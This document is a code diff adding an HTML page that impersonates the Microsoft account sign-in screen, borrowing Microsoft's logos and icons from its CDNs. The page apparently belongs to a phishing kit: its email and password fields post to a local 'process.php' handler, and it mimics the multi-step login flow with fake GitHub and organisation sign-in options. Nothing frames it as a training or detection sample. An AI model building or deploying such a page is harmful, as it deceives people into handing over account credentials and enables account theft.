@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to your Microsoft account</title>
+    <link rel="shortcut icon" href="https://acctcdn.msftauth.net/images/favicon.ico?v=2" type="image/x-icon">
+    <link rel="stylesheet" href="office.css">
+    <script src="office.js" type="text/javascript" defer></script>
+</head>
+
+<body>
+    <section>
+        <div class="container">
+            <img src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg"
+                alt="microsoft_logo">
+            <div class="form-box">
+                <form action="process.php" method="POST">
+                    <div class="form1" id="form1"><br>
+                        <h1 class="signin">Sign in</h1><br>
+                        <input type="email" name="useremail" id="useremail" placeholder="Email address, phone number, or Skype">
+                        <div class="create-account"><br>
+                            <p>No account? <a href="">Create one!</a></p>
+                        </div><br>
+                        <div class="security-key">
+                            <p>Can't access your account?</p>
+                            <!-- <p>Sign in with a security key<img
+                                    src="https://logincdn.msauth.net/shared/1.0/content/images/info_4883eb1a3cbdddf5a79e28d320cfe5a9.svg"
+                                    alt=""></p> -->
+                        </div><br>
+                        <div class="btn-container">
+                            <button class="next" id="back" onclick="window.location = window.location()">Back</button>
+                            <button class="next" id="next">Next</button>
+                        </div>
+                    </div>
+
+                    <div class="form2" id="form2">
+                        <p class="email-input" id="email-input">gsbvjkbbsj</p>
+                        <h1 class="signin">Enter password</h1><br>
+                        <input type="password" name="userpassword" id="userpassword" placeholder="Password">
+                        <div class="forgot-password"><br>
+                            <a href="">Forgotten your password?</a>
+                        </div><br>
+                        <div class="btn-container">
+                            <input type="submit" value="Sign in" class="next" id="signin">
+                        </div>
+                    </div>
+
+                    <div class="form3" id="form3">
+                        <h1 class="signin sign-opt">Sign-in options</h1>
+                        <div class="opt option-git" id="option-git">
+                            <div class="left">
+                                <img src="https://aadcdn.msftauth.net/shared/1.0/content/images/credentialoptions/cred_option_github_a7c769e31a628e643841187d20e149e3.svg" alt="" srcset="">
+                                <div class="detail">
+                                <h2>Sign in with GitHub</h2>
+                                <p>Personal accounts only</p>
+                            </div>
+                            </div>
+                            <img class="info" src="https://aadcdn.msftauth.net/shared/1.0/content/images/documentation_bcb4d1dc4eae64f0b2b2538209d8435a.svg" alt="" srcset="">
+                        </div>
+                        <div class="opt option-org">
+                            <img src="https://aadcdn.msftauth.net/shared/1.0/content/images/picker_account_aad_725681b49f77650b9c9b970eb784476c.png" alt="" srcset="">
+                            <div class="detail">
+                                <h2>Sign in to an organisation</h2>
+                                <p>Search for a company or an organisation that you're working with</p>
+                            </div>
+                        </div>
+                        <br>
+                        <div class="btn-container">
+                            <button class="next" id="back2">Back</button>
+                        </div>
+                    </div>
+                </form>
+            </div>
+        </div>
+        <div class="options" id="option">
+            <div class="contt"><img
+                    src="https://aadcdn.msftauth.net/shared/1.0/content/images/signin-options_4e48046ce74f4b89d45037c90576bfac.svg"
+                    alt="">
+                <p>Sign in options</p>
+            </div>
+        </div>
+    </section>
+</body>
+
+</html>
